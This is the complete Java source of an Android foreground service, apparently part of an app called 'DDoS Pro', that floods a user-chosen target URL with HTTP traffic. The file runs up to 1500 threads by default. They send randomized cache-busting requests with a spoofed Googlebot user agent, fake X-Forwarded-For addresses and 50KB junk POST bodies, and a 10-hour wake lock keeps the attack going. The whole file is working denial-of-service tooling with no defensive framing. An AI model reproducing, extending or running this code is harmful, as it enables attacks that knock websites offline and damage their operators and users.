package com.mzkyzak.ddospro;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import androidx.core.app.NotificationCompat;
import okhttp3.*;
import java.io.IOException;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicLong;

public class AttackService extends Service {
    public static final AtomicLong packetCount = new AtomicLong(0);
    public static final AtomicLong packetPerSecond = new AtomicLong(0);
    public static final AtomicLong totalBytesSent = new AtomicLong(0);
    public static final AtomicLong successCount = new AtomicLong(0);
    public static final AtomicLong failCount = new AtomicLong(0);
    public static volatile String lastStatus = "IDLE";
    public static volatile int lastResponseCode = 0;
    public static final AtomicLong lastLatency = new AtomicLong(0);

    private volatile boolean isRunning = true;
    private String target;
    private Handler handler = new Handler(Looper.getMainLooper());
    private OkHttpClient client;
    private ExecutorService threadPool;
    private PowerManager.WakeLock wakeLock;

    private final String[] USER_AGENTS = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
            "Googlebot/2.1 (+http://www.google.com/bot.html)"
    };

    @Override
    public void onCreate() {
        super.onCreate();
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DDoSPro:WakeLock");
        wakeLock.acquire(10 * 60 * 60 * 1000L); // 10 Hours
        threadPool = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors() * 12);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_STICKY;
        target = intent.getStringExtra("target");
        int threads = intent.getIntExtra("threads", 1500);
        int duration = intent.getIntExtra("duration", 600);

        client = new OkHttpClient.Builder()
                .connectionPool(new ConnectionPool(500, 10, TimeUnit.MINUTES))
                .connectTimeout(50, TimeUnit.MILLISECONDS)
                .readTimeout(50, TimeUnit.MILLISECONDS)
                .writeTimeout(50, TimeUnit.MILLISECONDS)
                .retryOnConnectionFailure(true)
                .build();

        packetCount.set(0);
        packetPerSecond.set(0);
        totalBytesSent.set(0);
        successCount.set(0);
        failCount.set(0);
        lastStatus = "STARTED";
        showNotification();

        Random random = new Random();
        int payloadSize = 1024 * 50;

        for (int i = 0; i < threads; i++) {
            threadPool.execute(() -> {
                while (isRunning) {
                    try {
                        long startTime = System.currentTimeMillis();
                        String url = target + "/" + UUID.randomUUID() + "?t=" + System.currentTimeMillis();
                        Request.Builder builder = new Request.Builder()
                                .url(url)
                                .header("User-Agent", USER_AGENTS[random.nextInt(USER_AGENTS.length)])
                                .header("Cache-Control", "no-cache")
                                .header("Connection", "keep-alive")
                                .header("X-Forwarded-For", Utils.generateRandomIP())
                                .header("Range", "bytes=0-" + (random.nextInt(10000) + 5000));

                        if (random.nextBoolean()) {
                            StringBuilder sb = new StringBuilder("x=");
                            for (int k = 0; k < payloadSize; k++) sb.append("A");
                            String payload = sb.toString();
                            builder.post(RequestBody.create(
                                    MediaType.parse("text/plain"),
                                    payload
                            ));
                            totalBytesSent.addAndGet(payloadSize);
                        } else {
                            builder.get();
                            totalBytesSent.addAndGet(512);
                        }

                        client.newCall(builder.build()).enqueue(new Callback() {
                            @Override
                            public void onFailure(Call call, IOException e) {
                                packetCount.incrementAndGet();
                                failCount.incrementAndGet();
                                lastStatus = "FAILED: " + e.getMessage();
                            }

                            @Override
                            public void onResponse(Call call, Response response) throws IOException {
                                long latency = System.currentTimeMillis() - startTime;
                                packetCount.incrementAndGet();
                                successCount.incrementAndGet();
                                lastResponseCode = response.code();
                                lastLatency.set(latency);
                                lastStatus = "OK (" + response.code() + ")";
                                response.close();
                            }
                        });
                    } catch (Exception ignored) {}
                }
            });
        }

        handler.postDelayed(new Runnable() {
            private long lastCount = 0;
            @Override
            public void run() {
                if (!isRunning) return;
                long current = packetCount.get();
                packetPerSecond.set(current - lastCount);
                lastCount = current;
                handler.postDelayed(this, 1000);
            }
        }, 1000);

        if (duration > 0) {
            handler.postDelayed(() -> {
                isRunning = false;
                lastStatus = "STOPPED";
                stopSelf();
            }, duration * 1000L);
        }

        return START_STICKY;
    }

    private void showNotification() {
        String channelId = "ddos_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    channelId,
                    "DDoS Attack",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }

        Notification notification = new NotificationCompat.Builder(this, channelId)
                .setContentTitle("🔥 DDoS Pro")
                .setContentText("Target: " + target)
                .setSmallIcon(android.R.drawable.ic_dialog_alert)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(1, notification);
        }
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        if (threadPool != null) threadPool.shutdownNow();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}